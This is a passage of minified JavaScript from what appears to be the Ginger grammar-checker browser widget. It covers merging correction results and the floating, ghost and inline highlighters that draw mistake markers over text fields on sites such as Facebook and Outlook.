                (function(r) {
                    if (i[r].ignored || i[r].charLimited) {
                        g--;
                    } else if (i[r].text.length < 4 || i[r].text.match(/^[\s\u200b]*$/)) {
                        g--;
                    } else {
                        var e = !!i[r].activeSentence;
                        if (e) {
                            var t = false;
                            try {
                                if (!i[r].correction.Sentences[0].IsEnglish) {
                                    t = true;
                                }
                            } catch (e) {}
                            if (t) {
                                g--;
                                if (o) o(i);
                                if (g === 0 && a) {
                                    a(i);
                                }
                            } else {
                                s(i[r], function(e) {
                                    e.correction.checkType = "shallow";
                                    var t = l(e);
                                    i[r] = f(i[r], t);
                                    g--;
                                    if (o) o(i);
                                    if (g === 0 && a) {
                                        a(i);
                                    }
                                });
                            }
                        } else {
                            if (!i[r].correction || i[r].correction.checkType !== "deep") {
                                c(i[r], function(e) {
                                    e.correction.checkType = "deep";
                                    var t = l(e);
                                    i[r] = f(i[r], t);
                                    g--;
                                    if (o) o(i);
                                    if (g === 0 && a) {
                                        a(i);
                                    }
                                });
                            } else {
                                var n = l(i[r]);
                                g--;
                                if (n) {
                                    i[r] = n;
                                    if (o) o(i);
                                }
                            }
                        }
                    }
                    if (g === 0 && a) {
                        if (o) o(i);
                        a(i);
                    }
                })(e);
            }
        };
        var n = function() {
            return u;
        };
        var i = function(e) {
            u = e;
        };
        var d = function(e, t, r) {
            for (var n = 0; n < e.length; n++) {
                var i = e[n];
                if (i.From === t && i.To === r) {
                    return i;
                }
            }
            return null;
        };
        var f = function(e, t) {
            try {
                for (var r = 0; r < e.correction.Corrections.length; r++) {
                    var n = e.correction.Corrections[r];
                    var i = d(t.correction.Corrections, n.From, n.To);
                    if (i && i.Type === n.Type) {
                        i.id = n.id;
                    }
                }
            } catch (e) {
                if (false && console && console.warn) {
                    console.warn("grammar check result merge catch", e);
                }
            }
            return t;
        };
        var g = function(e, t) {
            if (!t.correction || !t.correction.Corrections.length) {
                return e;
            }
            var r = gingerModule.get("widget.utils").diffString(t.text, e.text);
            if (r.preCommon == 0 && r.postCommon == 0) {
                return e;
            }
            for (var n = 0; n < t.correction.Corrections.length; n++) {
                var i = t.correction.Corrections[n];
                if (r.to <= i.From) {
                    i.UXFrgFrom += r.diff;
                    i.UXFrgTo += r.diff;
                    i.From += r.diff;
                    i.To += r.diff;
                } else if (r.from >= i.To + 1) {} else {
                    t.correction.Corrections.splice(n, 1);
                    n--;
                }
            }
            e.correction = t.correction;
            return e;
        };
        var o = function(e, t) {
            var r = 0;
            var n = 0;
            if (!t.length || !e.length) {
                return e;
            }
            var i;
            var o;
            for (var a = 0; a < e.length && a < t.length; a++) {
                if (t[a].text === e[a].text) {
                    r = a + 1;
                    e[a].correction = t[a].correction;
                    e[a].id = t[a].id;
                    if (t[a].ignored) e[a].ignored = t[a].ignored;
                    if (e[a].ignored) delete e[a].correction;
                    t[a] = e[a];
                } else {
                    i = gingerModule.get("widget.utils").trimAndMatch(t[a].text);
                    o = gingerModule.get("widget.utils").trimAndMatch(e[a].text);
                    if (i.pre + i.text === o.pre + o.text) {
                        r = a + 1;
                        e[a].correction = t[a].correction;
                        e[a].id = t[a].id;
                        if (t[a].ignored) e[a].ignored = t[a].ignored;
                        if (e[a].charLimited) delete e[a].correction;
                        t[a] = e[a];
                    } else {
                        break;
                    }
                }
            }
            if (e.length <= r) {
                return e;
            }
            for (var a = 0; a < e.length && a < t.length; a++) {
                if (t.length - a - 1 <= r - 1) break;
                if (e.length - a - 1 <= r - 1) break;
                if (t[t.length - a - 1].text === e[e.length - a - 1].text) {
                    n = a + 1;
                    e[e.length - a - 1].correction = t[t.length - a - 1].correction;
                    e[e.length - a - 1].id = t[t.length - a - 1].id;
                    if (t[t.length - a - 1].ignored) e[e.length - a - 1].ignored = t[t.length - a - 1].ignored;
                    if (e[e.length - a - 1].charLimited) delete e[e.length - a - 1].correction;
                } else {
                    i = gingerModule.get("widget.utils").trimAndMatch(t[t.length - a - 1].text);
                    o = gingerModule.get("widget.utils").trimAndMatch(e[e.length - a - 1].text);
                    if (i.pre + i.text === o.pre + o.text) {
                        n = a + 1;
                        e[e.length - a - 1].correction = t[t.length - a - 1].correction;
                        e[e.length - a - 1].id = t[t.length - a - 1].id;
                        if (t[e.length - a - 1].ignored) e[e.length - a - 1].ignored = t[t.length - a - 1].ignored;
                        if (e[e.length - a - 1].charLimited) delete e[e.length - a - 1].correction;
                    } else {
                        break;
                    }
                }
            }
            for (var a = n; a < e.length - r && a < t.length - r; a++) {
                if (t.length - a - 1 < r) {
                    e[e.length - a - 1].id = gingerModule.get("widget.utils").generateUID();
                } else if (e.length - a - 1 < r) {} else {
                    if (e[e.length - a - 1].charLimited) {} else if (t[t.length - a - 1].correction && t[t.length - a - 1].correction.Sentences && !t[t.length - a - 1].correction.Sentences[0].IsEnglish) {
                        e[e.length - a - 1].correction = t[t.length - a - 1].correction;
                        if (t[t.length - a - 1].correction) e[e.length - a - 1].correction.checkType = "shallow";
                    } else if (t[t.length - a - 1].correction && t[t.length - a - 1].correction.Corrections.length) {
                        e[e.length - a - 1] = g(e[e.length - a - 1], t[t.length - a - 1]);
                        if (e[e.length - a - 1].correction) e[e.length - a - 1].correction.checkType = "shallow";
                    } else {}
                }
            }
            return e;
        };
        var a = function() {
            u = [];
        };
        return {
            correct: r,
            flush: a,
            correctSpellingOfSentence: s,
            mergeSentenceCorrections: g,
            mergeCorrections: o,
            ignoreMistake: t,
            getIgnoredWords: n,
            setIgnoredWords: i
        };
    }, [ "widget.phraseService", "widget.utils" ]);
})();

(function() {
    var e = gingerModule.load("widget.ghostModifiers", function() {
        var n = function(e) {
            if (!window.location) return null;
            var t = window.location.hostname.split(":")[0];
            return t.indexOf(e) != -1;
        };
        var i = {};
        i.faceBook = {
            domain: "facebook.com",
            modifier: function(e, t) {
                var r = $gingerWidgetJquery(e).closest("._2ihx._i-o").length;
                if (r) {
                    $gingerWidgetJquery(e).css("textAlign", "center");
                }
            }
        };
        i.unitTest = {
            domain: "localhost",
            modifier: function(e, t) {
                return;
            }
        };
        var e = function(e, t) {
            for (var r in i) {
                if (n(i[r].domain)) {
                    i[r].modifier(e, t);
                }
            }
        };
        return {
            process: e
        };
    });
})();

(function() {
    var e = gingerModule.load("widget.highlighters.floating", function() {
        var q;
        var k;
        var v = "gwmw";
        var t = true;
        var l;
        var r;
        var J;
        var e = [];
        var n = function(e) {
            if (!e) return;
            $gingerWidgetJquery(e).html($gingerWidgetJquery(e).html().replace(/<[\/]?gwmw[^>]*>/gi, ""));
            e = $gingerWidgetJquery(e);
            var t = e.parent();
            if (e.contents().length) {
                e.contents().insertBefore(e);
                e.remove();
            } else {
                e.remove();
            }
            t.find("b:empty,i:empty").remove();
        };
        var m = function(e, t) {
            var r = t.From + e.startsAt;
            var n = t.To + 1 + e.startsAt;
            if (!gingerModule.get("widget.utils").isRichTextElement(k)) {
                return [ {
                    node: k.childNodes[0],
                    from: r,
                    to: n
                } ];
            }
            return gingerModule.get("widget.utils").getNodeFragmentsOfIndex(k, r, n);
        };
        var T = 2;
        var h = function(e) {
            var t = gingerModule.get("widget.measure").getPaddingBox(q.element, J);
            var r = gingerModule.get("widget.measure").getScaleRatio(q.element);
            var n = t.height / r;
            var i = gingerModule.get("widget.measure").getElementScroll(k);
            var o = false;
            if (!Array.isArray(e)) {
                e = [ e ];
            }
            var a = [];
            var g = gingerModule.get("widget.measure").getDocumentScroll();
            var s = {
                top: 0,
                left: 0
            };
            if (document && document.body && document.body.contains(k)) {
                s = gingerModule.get("widget.measure").getDocumentGap(J);
            }
            var c = gingerModule.get("widget.measure").getPaddingBox(k, J);
            var l = g.left - s.left - c.left + i.left;
            var u = g.top - s.top - c.top + i.top;
            for (var d = 0; d < e.length; d++) try {
                var f = e[d];
                var p = document.createRange();
                p.setStart(f.node, f.from);
                p.setEnd(f.node, f.to);
                var v = Array.from(p.getClientRects());
                for (var m = 0; m < v.length; m++) {
                    var h = v[m];
                    if (h.width < .1) continue;
                    var w = a[a.length - 1];
                    var y = h.top + u;
                    var b = h.left + l;
                    var x = h.bottom + u + T;
                    var $ = h.right + l;
                    var C = h.width;
                    var M = n < h.height + T ? h.height : h.height + T;
                    if (w && w.right === b && w.top === y && w.bottom === x && w.height === M) {
                        w.right = $;
                        w.width = w.width + C;
                    } else {
                        a.push({
                            top: y,
                            left: b,
                            bottom: x,
                            right: $,
                            width: C,
                            height: M
                        });
                    }
                    var W = a[a.length - 1];
                    var S = a[a.length - 2];
                    if (S && W) if (W.top === S.top && W.left === S.left && W.width === S.width && W.height === S.height) {
                        a.pop();
                    }
                }
            } catch (e) {
                console.error("Ginger range selection failed.", e);
            }
            return a;
        };
        var i = function(e) {
            return {
                width: Math.min(e.scrollWidth, 32767),
                height: Math.min(e.scrollHeight, 32767)
            };
        };
        var o;
        var a = function(e) {
            if (o) {
                o = clearTimeout(o);
            }
            o = setTimeout(function() {
                g(e);
            }, 10);
        };
        var w;
        var g = function(e, t) {
            if (!e) return;
            w = e;
            if (!q.isEnabled() || !gingerModule.get("widget").isEnabled()) return;
            var r = gingerModule.get("widget.measure").getElementScroll(k);
            var n = gingerModule.get("widget.measure").getScaleRatio(k);
            var i = [];
            for (var o = 0; o < e.length; o++) {
                var a = e[o];
                if (a.correction) {
                    for (var g = 0; g < a.correction.Corrections.length; g++) {
                        var s = a.correction.Corrections[g];
                        if (s.ignored) continue;
                        i.push(s.id);
                        var c = m(a, s);
                        var l = h(c);
                        var u = $gingerWidgetJquery(y).find(".gwmw-" + s.id);
                        if (u.length > l.length) {
                            for (var d = Math.max(0, l.length - 1); d < u.length; d++) {
                                u[d].remove();
                            }
                        }
                        for (var f = 0; f < l.length; f++) {
                            var p = u.filter(".gwmwi-" + f);
                            if (s.Suggestions.length !== 0 || !s.Confidence) {
                                p.removeClass("no-suggestion");
                            } else {
                                p.addClass("no-suggestion");
                            }
                            if (!p.length) {
                                p = $gingerWidgetJquery(document.createElement(v));
                                p.css("position", "absolute");
                                p.addClass("ginger-module-highlighter-mistake-type-" + s.Type);
                                p.addClass("gwmw-" + s.id);
                                p.addClass("gwmwi-" + f);
                                p.data("cid", s.id);
                                p.addClass("ginger-module-highlighter-mistake-anim");
                                $gingerWidgetJquery(y).append(p);
                            }
                            p.css("top", l[f].top);
                            p.css("width", l[f].width);
                            p.css("height", l[f].height);
                            p.css("left", l[f].left);
                        }
                    }
                }
            }
            $gingerWidgetJquery(y).find("gwmw").each(function(e, t) {
                var r = $gingerWidgetJquery(t).data("cid");
                if (i.indexOf(r) === -1) {
                    $gingerWidgetJquery(t).remove();
                }
            });
            x();
        };
        var s = function() {
            return $gingerWidgetJquery(y).find(v);
        };
        var c = function(e) {
            if (!e) {
                $gingerWidgetJquery(f).hide();
            } else {
                $gingerWidgetJquery(f).show();
            }
            t = e;
            q.events.listen.trigger("mutation");
        };
        var u = function() {
            $gingerWidgetJquery(f).remove();
            if (W) {
                clearInterval(W);
            }
        };
        var d = function(e) {
            var t = document.styleSheets, r = [];
            if (!t) return;
            e.matches = e.matches || e.webkitMatchesSelector || e.mozMatchesSelector || e.msMatchesSelector || e.oMatchesSelector;
            try {
                for (var n in t) {
                    var i = t[n].rules || t[n].cssRules;
                    for (var o in i) {
                        if (e.matches(i[o].selectorText)) {
                            r.push(i[o].cssText);
                            if (/[+]/.test(i[o].selectorText)) {
                                return true;
                            }
                        }
                    }
                }
            } catch (e) {}
            return false;
        };
        var f = $gingerWidgetJquery("<gdiv class='ginger-module-highlighter ginger-module-highlighter-float'></gdiv>");
        var y = $gingerWidgetJquery("<gdiv class='ginger-module-highlighter-float-content'></gdiv>");
        var p = function(e) {
            if (L()) {
                return b(e);
            }
            var t = $gingerWidgetJquery(k).css("position");
            if (l) {
                f.insertAfter($gingerWidgetJquery(k));
            } else if (t == "static" || t == "relative" || t == "absolute") {
                f.insertBefore($gingerWidgetJquery(k));
            } else {
                f.insertAfter($gingerWidgetJquery(k));
            }
            f.append(y);
            r = $gingerWidgetJquery(k).css("background");
            J = $gingerWidgetJquery(k).css("position");
            $gingerWidgetJquery(k).css("background", "transparent");
            $gingerWidgetJquery(f).css("background", r);
            if (A(k)) {
                $gingerWidgetJquery(k).css("overflowY", "auto");
            }
            if (F()) {
                $gingerWidgetJquery(f).css({
                    backgroundColor: "transparent",
                    zIndex: "2",
                    pointerEvents: "none"
                });
            }
        };
        var b = function(e) {
            if ($gingerWidgetJquery(".ginger-module-highlighter.ginger-module-highlighter-float")) {
                $gingerWidgetJquery(".ginger-module-highlighter.ginger-module-highlighter-float").remove();
            }
            f.appendTo($gingerWidgetJquery(document.querySelector("html")));
            f.append(y);
            if (!e) {
                r = $gingerWidgetJquery(k).css("background");
                J = $gingerWidgetJquery(k).css("position");
                $gingerWidgetJquery(f).css("background", "transparent");
                $gingerWidgetJquery(f).data("overridedZIndex", gingerModule.get("widget.measure").findHighestZIndex() + 25);
            }
            if (F()) {
                $gingerWidgetJquery(f).css({
                    backgroundColor: "transparent",
                    zIndex: "2",
                    pointerEvents: "none"
                });
            }
        };
        var x = function() {
            var e = $(k);
            f.get(0).scrollTop = e.top;
            f.get(0).scrollLeft = e.left;
        };
        var $ = function(e) {
            var t = e === window.document.body && "BackCompat" === window.document.compatMode;
            var r = t ? 0 : e.scrollTop;
            var n = t ? 0 : e.scrollLeft;
            return {
                top: r,
                left: n
            };
        };
        var C = function() {
            if (!$gingerWidgetJquery(k).is(":visible")) {
                return;
            }
            var e = parseInt($gingerWidgetJquery(k).css("z-index"));
            if (!e) e = 1;
            if (e < 2) e = 2;
            var t = $gingerWidgetJquery(k).data("gingerPositionCache");
            if (!t) {
                t = $gingerWidgetJquery(k).css("position");
                $gingerWidgetJquery(k).data("gingerPositionCache", t);
            }
            var r = $gingerWidgetJquery(k).data("gingerZindexCache");
            if (!r) {
                r = $gingerWidgetJquery(k).css("z-index");
                $gingerWidgetJquery(k).data("gingerZindexCache", r);
            }
            var n = t;
            if (n == "fixed") {
                $gingerWidgetJquery(f).css("position", "fixed");
                $gingerWidgetJquery(f).css("z-index", e - 1);
                $gingerWidgetJquery(k).css("z-index", e);
            } else if (n == "relative") {
                $gingerWidgetJquery(f).css("position", "absolute");
                if (l) {
                    $gingerWidgetJquery(f).css("z-index", e - 1);
                    $gingerWidgetJquery(k).css("z-index", e);
                }
            } else if (n == "absolute") {
                $gingerWidgetJquery(f).css("position", "absolute");
                $gingerWidgetJquery(f).css("z-index", e - 1);
                $gingerWidgetJquery(k).css("z-index", e);
            } else {
                $gingerWidgetJquery(k).css("position", "relative");
                $gingerWidgetJquery(f).css("position", "absolute");
                if (l) {
                    $gingerWidgetJquery(f).css("z-index", e - 1);
                    $gingerWidgetJquery(k).css("z-index", e);
                }
            }
            if ($gingerWidgetJquery(f).data("overridedZIndex")) {
                f.css("pointer-events", "none");
                $gingerWidgetJquery(f).css("z-index", $gingerWidgetJquery(f).data("overridedZIndex"));
            }
            var i = gingerModule.get("widget.measure").getPaddingBox(q.element, J);
            var o = gingerModule.get("widget.measure").getPaddingBox(f.get(0), J);
            var a = gingerModule.get("widget.measure").getScaleRatio(q.element);
            var g = getComputedStyle(f.get(0));
            var s = i.top - o.top;
            if (Math.abs(s) > .1) {
                f.css("marginTop", parseFloat(g["margin-top"]) + s);
            }
            var c = i.left - o.left;
            if (Math.abs(c) > .1) {
                f.css("marginLeft", parseFloat(g["margin-left"]) + c);
            }
            f.css("height", i.height / a);
            f.css("width", i.width / a);
            y.css("height", i.height + k.scrollHeight);
        };
        var y;
        var M = undefined;
        var W = undefined;
        var S = function(e) {
            q = e;
            k = q.element;
            l = d(k);
            p();
            C();
            $gingerWidgetJquery(k).on("scroll", function() {
                x();
            });
            if (L()) {
                q.events.listen.on("focus", function() {
                    p(true);
                    C();
                });
            }
            q.events.listen.on("mutation", function(e) {
                if (!q.isEnabled() || !gingerModule.get("widget").isEnabled()) return;
                C();
                g(w, true);
            });
        };
        var E = function(e) {
            if (!e || !e.parentNode) {
                return;
            }
            var t = new MutationObserver(function(e) {});
            t.observe(e.parentNode, {
                childList: true
            });
        };
        var L = function() {
            var e = window.location.hostname.split(".");
            return e && e.length && e[e.length - 2] === "qualtrics";
        };
        var A = function(e) {
            if (/facebook.com/.test(location.hostname)) {
                var t = document.querySelectorAll('[data-pagelet="ChatTab"]');
                if (t && t.length) {
                    for (var r = 0; r < t.length; r++) {
                        if (t[r].contains(e)) {
                            return true;
                        }
                    }
                }
            }
            return false;
        };
        var F = function() {
            return /outlook.live.com|outlook.office365.com|outlook.office.com/.test(location.hostname);
        };
        var I = function(t) {
            if (!t) {
                return;
            }
            var r = t.getBoundingClientRect();
            W = setInterval(function() {
                var e = t.getBoundingClientRect();
                if (e.x !== r.x || e.y !== r.y) {
                    C();
                    r = e;
                }
            }, 5);
        };
        return {
            refresh: a,
            init: S,
            setVisibility: c,
            getMistakeElements: s,
            destroy: u
        };
    }, [ "widget.utils", "widget.selectionManager" ]);
})();

(function() {
    var e = gingerModule.load("widget.highlighters.ghost", function() {
        var c;
        var l;
        var u;
        var d = "gwsw";
        var f = "gwmw";
        var a = true;
        var s = false;
        var g = [];
        var t = function(e) {
            var t = document.styleSheets, r = [];
            if (!t) return;
            e.matches = e.matches || e.webkitMatchesSelector || e.mozMatchesSelector || e.msMatchesSelector || e.oMatchesSelector;
            try {
                for (var n in t) {
                    var i = t[n].rules || t[n].cssRules;
                    for (var o in i) {
                        if (e.matches(i[o].selectorText)) {
                            r.push(i[o].cssText);
                            if (/[+]/.test(i[o].selectorText)) {
                                return true;
                            }
                        }
                    }
                }
            } catch (e) {}
            return false;
        };
        var p = function() {
            if (!$gingerWidgetJquery(l).is(":visible")) {
                return;
            }
            var e = $gingerWidgetJquery(l).position();
            var t = gingerModule.get("widget.measure").getPaddingBox(l);
            var r = window.devicePixelRatio || 1;
            if ($gingerWidgetJquery(u).css("box-sizing") === "border-box") {
                $gingerWidgetJquery(u).css("height", t.height + t.border.top + t.border.bottom);
                $gingerWidgetJquery(u).css("width", t.width + t.border.left + t.border.right);
            } else {
                var n = window.getComputedStyle(l);
                $gingerWidgetJquery(u).css("height", t.height - parseInt(n["padding-top"]) - parseInt(n["padding-bottom"]));
                $gingerWidgetJquery(u).css("width", t.width - parseInt(n["padding-right"]) - parseInt(n["padding-left"]));
            }
            var i = parseInt($gingerWidgetJquery(l).css("z-index"));
            if (!i) i = 1;
            if (i < 2) i = 2;
            var o = $gingerWidgetJquery(l).data("gingerPositionCache");
            if (!o) {
                o = $gingerWidgetJquery(l).css("position");
                $gingerWidgetJquery(l).data("gingerPositionCache", o);
            }
            var a = $gingerWidgetJquery(l).data("gingerZindexCache");
            if (!a) {
                a = $gingerWidgetJquery(l).css("z-index");
                $gingerWidgetJquery(l).data("gingerZindexCache", a);
            }
            var g = o;
            if (g == "fixed") {
                $gingerWidgetJquery(u).css("position", "fixed");
                $gingerWidgetJquery(u).css("z-index", i - 1);
                $gingerWidgetJquery(l).css("z-index", i);
                $gingerWidgetJquery(u).css("top", e.top);
                $gingerWidgetJquery(u).css("left", e.left);
            } else if (g == "relative") {
                $gingerWidgetJquery(u).css("position", "absolute");
                $gingerWidgetJquery(u).css("top", e.top);
                $gingerWidgetJquery(u).css("left", e.left);
                if (s) {
                    $gingerWidgetJquery(u).css("top", e.top);
                    $gingerWidgetJquery(u).css("left", e.left);
                    $gingerWidgetJquery(u).css("z-index", i - 1);
                    $gingerWidgetJquery(l).css("z-index", i);
                }
            } else if (g == "absolute") {
                $gingerWidgetJquery(u).css("position", "absolute");
                $gingerWidgetJquery(u).css("z-index", i - 1);
                $gingerWidgetJquery(l).css("z-index", i);
                $gingerWidgetJquery(u).css("top", e.top);
                $gingerWidgetJquery(u).css("left", e.left);
            } else {
                $gingerWidgetJquery(l).css("position", "relative");
                $gingerWidgetJquery(u).css("position", "absolute");
                $gingerWidgetJquery(u).css("top", e.top);
                $gingerWidgetJquery(u).css("left", e.left);
                if (s) {
                    $gingerWidgetJquery(u).css("top", e.top);
                    $gingerWidgetJquery(u).css("left", e.left);
                    $gingerWidgetJquery(u).css("z-index", i - 1);
                    $gingerWidgetJquery(l).css("z-index", i);
                }
            }
        };
        var v = function(e) {
            return e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        };
        var m = function(e, t) {
            var r = $gingerWidgetJquery("<" + d + " />").get(0);
            r.id = "gws-" + e.id;
            var n = e.preLineBreakCount ? new Array(e.preLineBreakCount + 1).join("\n") : "";
            var i = e.postLineBreakCount ? new Array(e.postLineBreakCount + 1).join("\n") : "";
            if (!e.correction || !e.correction.Corrections.length) {
                r.innerHTML = n + v(e.text) + i;
                return r;
            }
            r.innerHTML += n;
            var o = gingerModule.get("widget.phraseService").getSentenceFragments(e);
            var a = "";
            for (var g = 0; g < o.length; g++) {
                var s;
                if (o[g].correction && !o[g].correction.ignored) {
                    var c = false;
                    if (t.indexOf(o[g].correction.id) === -1 && !$gingerWidgetJquery(u).find("#" + f + "-" + o[g].correction.id).length) {
                        c = true;
                    }
                    s = document.createElement(f);
                    s.className = "ginger-module-highlighter-mistake-type-" + o[g].correction.Type;
                    s.className += " gwmw-" + o[g].correction.id;
                    $gingerWidgetJquery(s).data("cid", o[g].correction.id);
                    $gingerWidgetJquery(s).attr("id", "gwmw-" + o[g].correction.id);
                    if (c) {
                        s.className += " ginger-module-highlighter-mistake-anim";
                    }
                    if (o[g].correction.Suggestions.length !== 0 || !o[g].correction.Confidence) {
                        $gingerWidgetJquery(s).removeClass("no-suggestion");
                    } else {
                        s.className += " no-suggestion";
                    }
                    s.appendChild(document.createTextNode(o[g].text));
                } else {
                    s = document.createTextNode(o[g].text);
                }
                r.appendChild(s);
            }
            r.innerHTML += i;
            return r;
        };
        function e() {
            var e = document.createElement("div");
            e.style.visibility = "hidden";
            e.style.overflow = "scroll";
            e.style.msOverflowStyle = "scrollbar";
            document.body.appendChild(e);
            var t = document.createElement("div");
            e.appendChild(t);
            var r = e.offsetWidth - t.offsetWidth;
            e.parentNode.removeChild(e);
            return r;
        }
        var h = function() {
            if (!c.isEnabled()) return;
            var e = $gingerWidgetJquery(l).css("background");
            var t = $gingerWidgetJquery(l).css("background-image");
            var r = $gingerWidgetJquery(l).css("background-color");
            var n = t == "none" && r == "rgba(0, 0, 0, 0)" ? true : false;
            if (!n) {
                $gingerWidgetJquery(l).get(0).style.setProperty("background", "none", "important");
                $gingerWidgetJquery(l).data("gingerBackgroundCache", e);
            }
            var i = l;
            if (l.childNodes.length && /mentions-texteditor__content/.test(l.childNodes[0].className)) {
                i = l.childNodes[0];
            }
            var o = [ "color", "borderRadius", "border", "borderColor", "boxSizing", "paddingTop", "paddingLeft", "paddingRight", "paddingBottom", "marginTop", "marginLeft", "marginRight", "marginBottom", "fontFamily", "direction", "fontSize", "textAlign", "letterSpacing", "fontWeight", "whiteSpace", "overflowWrap" ];
            for (var a = 0; a < o.length; a++) {
                $gingerWidgetJquery(u).css(o[a], $gingerWidgetJquery(l).css(o[a]));
            }
            var g = $gingerWidgetJquery(i).css("lineHeight");
            $gingerWidgetJquery(u).css("lineHeight", g);
            $gingerWidgetJquery(i).css("lineHeight", g);
            var s = $gingerWidgetJquery(i).data("gingerBackgroundCache");
            if (s) {
                $gingerWidgetJquery(u).css("background", s);
            }
            $gingerWidgetJquery(u).css({
                color: "rgba(0,0,0,0)"
            });
            $gingerWidgetJquery(u).css({
                display: "block"
            });
            if (gingerModule.get("widget.utils").isRichTextElement(i)) {
                $gingerWidgetJquery(u).css("white-space", "pre-wrap");
            } else {
                $gingerWidgetJquery(u).css("white-space", $gingerWidgetJquery(i).css("white-space"));
            }
            gingerModule.get("widget.ghostModifiers").process(i, u);
        };
        var r = function(e) {
            if (!c.isEnabled() || !gingerModule.get("widget").isEnabled()) return;
            if (!a) return;
            var t = gingerModule.get("widget.utils").clone(e);
            try {
                if (t[t.length - 1].text.match(/\n$/)) {
                    t[t.length - 1].text += "\n";
                }
            } catch (e) {}
            h();
            p();
            var r = $gingerWidgetJquery(u).find(f).map(function() {
                return this.id.substring((f + "-").length);
            }).get();
            var n = $gingerWidgetJquery(u).find(d);
            for (var i = 0; i < t.length || i < n.length; i++) {
                var o = !g[i] || JSON.stringify(t[i]) !== JSON.stringify(g[i]);
                if (!t[i]) {
                    $gingerWidgetJquery(n[i]).remove();
                } else if (!n[i]) {
                    $gingerWidgetJquery(u).append(m(t[i], r));
                } else if (o) {
                    $gingerWidgetJquery(n[i]).replaceWith(m(t[i], r));
                } else {}
            }
            g = t;
            w();
        };
        var w = function() {
            var e = gingerModule.get("widget.measure").getElementScroll(l);
            u.scrollTop(e.top);
            u.scrollLeft(e.left);
        };
        var n = function() {
            var e = $gingerWidgetJquery(l).css("position");
            if (s) {
                u = $gingerWidgetJquery("<div class='ginger-module-highlighter ginger-module-highlighter-ghost'></div>").insertAfter($gingerWidgetJquery(l));
            } else if (e == "static" || e == "relative") {
                u = $gingerWidgetJquery("<div class='ginger-module-highlighter ginger-module-highlighter-ghost'></div>").insertBefore($gingerWidgetJquery(l));
            } else {
                u = $gingerWidgetJquery("<div class='ginger-module-highlighter ginger-module-highlighter-ghost'></div>").insertAfter($gingerWidgetJquery(l));
            }
        };
        var i = function() {
            return $gingerWidgetJquery(u).find(f);
        };
        var o = function(e) {
            if (e) {
                $gingerWidgetJquery(u).show();
            } else {
                $gingerWidgetJquery(u).hide();
                var t = $gingerWidgetJquery(l).data("gingerBackgroundCache");
                if (t) {
                    $gingerWidgetJquery(l).css("background", t);
                }
            }
            a = !!e;
        };
        var y = function() {
            var e = $gingerWidgetJquery(l).data("gingerBackgroundCache");
            if (e) {
                $gingerWidgetJquery(l).css("background", e);
            }
            $gingerWidgetJquery(l).css("position", $gingerWidgetJquery(l).data("gingerPositionCache") || "");
            $gingerWidgetJquery(l).css("z-index", $gingerWidgetJquery(l).data("gingerZindexCache") || "");
            c.events.listen.off("mutation.ghostUpdate");
            $gingerWidgetJquery(l).off("blur", p);
            $gingerWidgetJquery(l).off("scroll", w);
            $gingerWidgetJquery(u).remove();
        };
        var b = function(e) {
            c = e;
            l = c.element;
            s = t(l);
            $gingerWidgetJquery(l).blur(p);
            $gingerWidgetJquery(l).scroll(w);
            l.addEventListener("scroll", w);
            c.events.listen.on("mutation.ghostUpdate", function() {
                if (!c.isEnabled() || !gingerModule.get("widget").isEnabled()) return;
                var e = window.devicePixelRatio || 1;
                if (e < 1) {
                    y();
                } else {
                    u.show();
                }
                h();
                p();
            });
            n();
            p();
        };
        return {
            refresh: r,
            refreshPosition: p,
            init: b,
            setVisibility: o,
            scrollUpdate: w,
            getMistakeElements: i,
            destroy: y
        };
    }, [ "widget.utils", "widget.phraseService", "widget.ghostModifiers", "widget.measure" ]);
})();

(function() {
    var e = gingerModule.load("widget.highlighters.inline", function() {
        var m;
        var h;
        var w = "gwmw";
        var y = true;
        var b = false;
        var x = function() {
            var e = /emailauthorframe\.jsp\?email_type=html/.test(window.location.href);
            if (e) {
                w = "span";
            }
        };
        var e = function(e, t) {
            var r = "p,h1, h2, h3, h4, h5, h6,li,pre,address,blockquote,dl,div";
            if (e === t) return false;
            var n = $gingerWidgetJquery(e).parents().has(t).first();
            var i = $gingerWidgetJquery(e).parentsUntil(n, r).length;
            var o = $gingerWidgetJquery(t).parentsUntil(n, r).length;
            return i || o ? true : false;
        };
        var $ = function(e, t, r) {
            var n = r.From + t.startsAt;
            var i = r.To + 1 + t.startsAt;
            var o = gingerModule.get("widget.utils").getNodeOffsetOfIndex(e, n, i);
            if (!o.startNode || !o.endNode) {
                return;
            }
            var a = g(w, o.startNode, o.startNodeOffset, o.endNode, o.endNodeOffset);
            $gingerWidgetJquery(e).find("b:empty,i:empty").remove();
            e.normalize();
            return a;
        };
        var C = function() {
            return gingerModule.get("widget.selectionManager").saveSelection(h);
        };
        var M = function() {
            return gingerModule.get("widget.selectionManager").restoreSelection(h);
        };
        var g = function(e, t, r, n, i) {
            var o = document.createRange();
            try {
                o.setStart(t, r);
                o.setEnd(n, i);
            } catch (e) {
                console.error(e);
            }
            var a = document.createElement(e);
            a.appendChild(o.extractContents());
            o.insertNode(a);
            return a;
        };
        var W = function(e) {
            if (!e) return;
            $gingerWidgetJquery(e).html($gingerWidgetJquery(e).html().replace(/<[\/]?gwmw[^>]*>/gi, ""));
            e = $gingerWidgetJquery(e);
            var t = e.parent();
            if (e.contents().length) {
                e.contents().insertBefore(e);
                e.remove();
            } else {
                e.remove();
            }
            t.find("b:empty,i:empty").remove();
        };
        var S = function() {
            var e = $gingerWidgetJquery(h).find("span[style]");
            e.each(function(e, t) {
                var r = $gingerWidgetJquery(t).css("background-color");
                if (r) {
                    r = r.toLowerCase().replace(/ /g, "");
                    if (r === "rgba(255,115,115,0.3)" || r === "rgba(87,131,204,0.3)") {
                        $gingerWidgetJquery(t).css("background-color", "");
                    }
                }
            });
        };
        var q = function() {
            $gingerWidgetJquery(h).find(".XjviVd").slice(1).remove();
        };
        var t = function(e, t) {
            for (var r = 0; r < t.length; r++) {
                if (t[r].id === e) return t[r];
            }
            return null;
        };
        var k = function(e, t) {
            var r = document.getElementById("gwmw-" + e.id);
            if (!t || !e || r.innerText !== t.text.substring(e.From, e.To + 1) || r.querySelectorAll(w).length) {
                return false;
            }
            return true;
        };
        var J = function(e, t, r, n) {
            if (window.location.hostname.indexOf("lightning.force.com") != -1) {
                if (r.id === t[t.length - 1].id && n.id === r.correction.Corrections[r.correction.Corrections.length - 1].id) {
                    var i = r.words[r.words.length - 1];
                    if (i.startsAt - r.startsAt === n.From && i.endsAt - r.startsAt === n.To + 1) {
                        if (!$gingerWidgetJquery("gwcphb").next().length) {
                            return true;
                        }
                    }
